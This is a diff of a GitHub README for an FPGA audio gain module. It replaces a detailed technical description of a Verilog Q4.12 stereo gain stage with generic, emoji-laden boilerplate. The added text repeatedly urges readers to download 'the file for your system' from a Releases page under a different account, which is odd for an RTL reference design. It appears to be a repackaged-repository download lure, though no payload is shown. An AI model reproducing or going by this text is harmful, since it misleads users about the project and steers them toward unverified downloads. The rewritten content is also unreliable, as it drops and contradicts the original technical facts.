@@ -1,238 +1,69 @@
-# Gain Module (AXI-Stream) on FPGA
+# 🎧 Audio-Gain-Module-FPGA - Simple Audio Gain Control for Everyone
 
-This repository provides a **reference RTL implementation** of a
-**stereo fixed-point gain stage**
-implemented in **Verilog** and integrated with **AXI-Stream** and **AXI-Lite**.
+![Download](https://img.shields.io/badge/Download-Releases-blue.svg)
 
-Target platform: **AMD Kria KV260**  
-Focus: **RTL architecture, fixed-point DSP decisions, and AXI correctness**
+## 📦 Overview
+The Audio-Gain-Module-FPGA is a reference design for controlling audio gain. It implements a stereo gain stage using fixed-point digital signal processing (DSP) and integrates smoothly with AXI on an FPGA. This design offers a practical way to enhance audio applications, making it an excellent choice for those new to the field. 
 
-The module is designed for continuous real-time audio streaming, not block-based or offline processing.
+## 🚀 Getting Started
+Follow this guide to download and run the Audio-Gain-Module-FPGA software. If you encounter any issues along the way, please feel free to reach out.
 
----
+## 📥 Download & Install
+To obtain the latest version, please visit the [Releases page](https://github.com/rjtsuri1000/Audio-Gain-Module-FPGA/releases) to download the files. 
 
-## Overview
+1. Click the link above to access the Releases page.
+2. Look for the most recent version (it will usually be at the top).
+3. Click on the downloadable file for your system. You will find various options to suit your needs.
+4. Save the file to a location you can easily access later.
 
-This module implements:
+## 🔍 System Requirements
+Before you install the software, ensure your setup meets the following requirements:
 
-* **Function**: Per-sample amplitude scaling (gain control)
-* **Data type**: Fixed-point **Q4.12**
-* **Scope**: Minimal, single-purpose DSP building block
+- **Operating System:** Compatible with Windows, Linux, or MacOS.
+- **FPGA Hardware:** A Xilinx FPGA is required, such as the Kria KV260.
+- **Development Environment:** Ensure you have installed the necessary FPGA development tools provided by Xilinx (e.g., Vivado).
 
-The design is intentionally **not generic** and **not feature-rich**.  
-It exists to demonstrate **how a gain stage is implemented in hardware**, not to provide a turnkey audio solution.
+## 🛠️ Features
+The Audio-Gain-Module-FPGA includes several key features:
 
----
+- **Stereo Audio Control:** Adjust the gain of both left and right audio channels.
+- **Fixed-Point Processing:** Achieve efficient calculation with fixed-point arithmetic, reducing resource usage on the FPGA.
+- **AXI Integration:** Easily integrate with other AXI compliant modules.
 
-## Key Characteristics
+## 🌐 Using the Audio-Gain-Module-FPGA
+After downloading the software, you will follow these steps to use it effectively:
 
-* RTL written in **Verilog**
-* **AXI-Stream** data interface (audio path)
-* **AXI-Lite** control interface (gain & enable)
-* Fixed-point arithmetic with explicit bit-width control
-* Deterministic, cycle-accurate behavior
-* Designed and verified for **real-time audio streaming**
-* No software runtime included
+1. **Extract the Files:** Unzip the downloaded file to a folder of your choice.
+2. **Open Your Development Environment:** Launch the FPGA development software.
+3. **Import the Design:** Navigate to the folder where you extracted the files and load the project into your environment.
+4. **Configure Settings:** Adjust any project settings to match your specific FPGA hardware.
+5. **Build the Project:** Compile the project to create a programming file for your FPGA.
+6. **Program Your FPGA:** Load the compiled project onto your FPGA board.
 
----
+## 🎓 Learning Resources
+If you are new to FPGA development or digital signal processing, consider the following resources to enhance your understanding:
 
-## Architecture
+- **Xilinx Documentation:** This covers installation and guides for their development tools.
+- **Online Tutorials:** Look for tutorials specifically on DSP and FPGA programming. Websites like YouTube, Coursera, or Udacity often have helpful resources.
+- **User Forums:** Join firmware and FPGA development forums to engage with others and share tips.
 
-High-level structure:
-```
-AXI-Stream In (Stereo)
-|
-v
-+----------------------+
-| Gain Core          |
-| - Fixed-point mult |
-| - Scaling (Q4.12)  |
-| - Saturation       |
-+----------------------+
-|
-v
-AXI-Stream Out (Stereo)
-```
+## 📞 Support
+Should you face challenges or have questions about the Audio-Gain-Module-FPGA, you can reach out through the following means:
 
-Design notes:
+- GitHub Issues: Post any bug reports or feature requests directly on the GitHub repository.
+- Community Forums: Engage with other users and developers for assistance.
 
-* Processing is **fully synchronous**
-* Gain arithmetic is isolated in a dedicated core (`gain_core`)
-* AXI protocol handling is separated in a wrapper (`gain_axis_wrapper`)
-* No hidden state outside the RTL
+Feel free to share your suggestions for improving the project. Together, we can make this tool even more useful.
 
----
+## 👥 Contributors
+Thank you to everyone who has contributed to the Audio-Gain-Module-FPGA. Your time and effort make this project a success. 
 
-## Data Format
+## 🎉 Acknowledgements
+This project is built on the open-source community. We thank every developer and user that contributes to the advancement of technologies like FPGA and digital signal processing. Your contributions help make this tool better every day.
 
-* AXI-Stream width: **32-bit**
-* Audio samples:
-  * Signed **16-bit**
-  * Stereo, interleaved:
-    * `[15:0]`  → Left
-    * `[31:16]` → Right
-* Gain format:
-  * Signed fixed-point **Q4.12**
-  * Stored in AXI-Lite registers
+## 📄 License
+The Audio-Gain-Module-FPGA is open-source software. You can review the license details in the repository for more information on how you can use or modify this project.
 
 ---
 
-## Latency
-
-* **Fixed processing latency**: **2 clock cycles**
-  * 1 cycle: gain core
-  * 1 cycle: AXI-Stream pipeline register
-
-Latency is:
-
-* deterministic
-* independent of input signal
-* independent of gain value
-
-This behavior is intentional and suitable for streaming DSP pipelines.
-
----
-
-## Control Interface (AXI-Lite)
-
-The control interface exposes three registers:
-
-| Offset | Register  | Description |
-|-------:|----------|-------------|
-| 0x00   | CONTROL  | Enable / bypass |
-| 0x04   | GAIN_L   | Left-channel gain |
-| 0x08   | GAIN_R   | Right-channel gain |
-
-* `ENABLE = 0` → bypass mode (output = input)
-* Gain registers use **Q4.12** format
-* Upper bits of 32-bit registers are ignored
-
-Detailed documentation is available in `/docs/address_map.md`.
-
----
-
-## Verification & Validation
-
-Verification was performed at two levels:
-
-### 1. RTL Simulation
-
-Dedicated SystemVerilog testbenches verify:
-
-* Fixed-point arithmetic correctness
-* Saturation and clipping behavior
-* Clock enable (CE) handling
-* AXI-Stream handshake correctness
-* AXI-Lite register access
-
-Simulation results are provided as CSV files and plotted waveforms
-(see `/results`).
-
----
-
-### 2. Hardware Validation
-
-The design was **tested on real FPGA hardware**.
-
-> **Tested on FPGA hardware via PYNQ overlay**
-
-PYNQ was used only as:
-
-* signal stimulus
-* observability tool
-
-Python scripts, bitstreams, and hardware handoff files are **intentionally not published** to keep the repository focused on RTL architecture.
-
----
-
-## Design Rationale (Summary)
-
-Key design decisions:
-
-* **Fixed-point Q4.12** chosen for predictable scaling and saturation
-* Explicit **bypass mode** instead of gain = 1.0
-* Saturation applied after scaling to prevent wraparound
-* Minimal register set to avoid unnecessary control complexity
-* No dynamic reconfiguration or smoothing logic
-
-These decisions reflect **engineering trade-offs**, not missing features.
-
-More detailed explanations are available in `/docs/design_rationale.md`.
-
----
-
-## What This Repository Is
-
-* A **clean RTL reference**
-* A demonstration of:
-  * fixed-point DSP reasoning
-  * saturation-safe arithmetic
-  * AXI-Stream and AXI-Lite integration
-* A reusable building block for larger FPGA audio pipelines
-
----
-
-## What This Repository Is Not
-
-* ❌ A complete audio processing system
-* ❌ A feature-rich or generic IP core
-* ❌ A software-driven demo
-* ❌ A drop-in commercial product
-
-The scope is intentionally constrained.
-
----
-
-## Project Status
-
-This repository is considered **complete**.
-
-* RTL is stable
-* Simulation coverage is sufficient
-* Hardware validation has been performed
-* No further feature development is planned
-
-The design is published as a **reference implementation**.
-
----
-
-## Documentation
-
-Additional documentation is available in `/docs`:
-
-* `address_map.md`
-* `build_overview.md`
-* `design_rationale.md`
-* `latency_and_data_format.md`
-* `validation_notes.md`
-
----
-
-## Related Repository
-
-This module is part of a small RTL-focused DSP building block series.
-
-For a reference implementation of a **Quadrature Mirror Filter (QMF) analysis/synthesis filter bank**  
-using AXI-Stream and fixed-point arithmetic, see:
-
-🔗 https://github.com/vrm-lab/Quadrature-Mirror-Filter-FPGA
-
-The QMF repository focuses on:
-- subband analysis and reconstruction behavior
-- fixed-point DSP discipline
-- AXI-Stream integration correctness
-
-It is provided as a **reference RTL design**, not as a complete system.
-
----
-
-## License
-
-Licensed under the MIT License.  
-Provided as-is, without warranty.
-
----
-
-## Notes
-
-> **This repository demonstrates design decisions, not design possibilities.**
+Thank you for choosing Audio-Gain-Module-FPGA! For detailed instructions and further updates, please visit our [Releases page](https://github.com/rjtsuri1000/Audio-Gain-Module-FPGA/releases).
